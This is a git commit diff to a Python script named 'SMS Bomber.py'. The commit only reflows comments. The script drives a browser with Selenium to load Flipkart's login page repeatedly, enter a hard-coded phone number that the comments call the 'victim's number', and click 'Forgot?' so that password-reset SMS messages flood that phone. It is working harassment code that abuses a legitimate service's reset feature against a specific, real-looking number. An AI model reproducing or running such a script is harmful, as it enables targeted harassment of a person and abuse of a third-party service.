8793b3a2ca471908c5ce6e91bbb6412bf8130062
Prakanshu Srivastava <42319499+prakanshu08@users.noreply.github.com>
2021-10-15 19:19:19 +0530

    Update SMS Bomber.py

--- SMS Bomber.py
+++ SMS Bomber.py
@@ -7,22 +7,19 @@ browser = webdriver.Chrome()
 # set the frequency of sms which is approx maximum to 10 per 24 days
 frequency = 10
 
-# target mobile number, change it to victim's number and
-# also ensure that it's registered on flipkart
+# target mobile number, change it to victim's number and also ensure that it's registered on flipkart
 mobile_number = "8299773269"
 
 for i in range(frequency):
     browser.get('https://www.flipkart.com/account/login?ret=/')
 
-    # find the element where we have to
-    # enter the number using the class name
+    # find the element where we have to enter the number using the class name
     number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
 
     # automatically type the target number
     number.send_keys("8299773269")
 
-    # find the element to send a forgot password
-    # request using it's class name
+    # find the element to send a forgot password request using it's class name
     forgot = browser.find_element_by_link_text('Forgot?')
 
     # clicking on that element
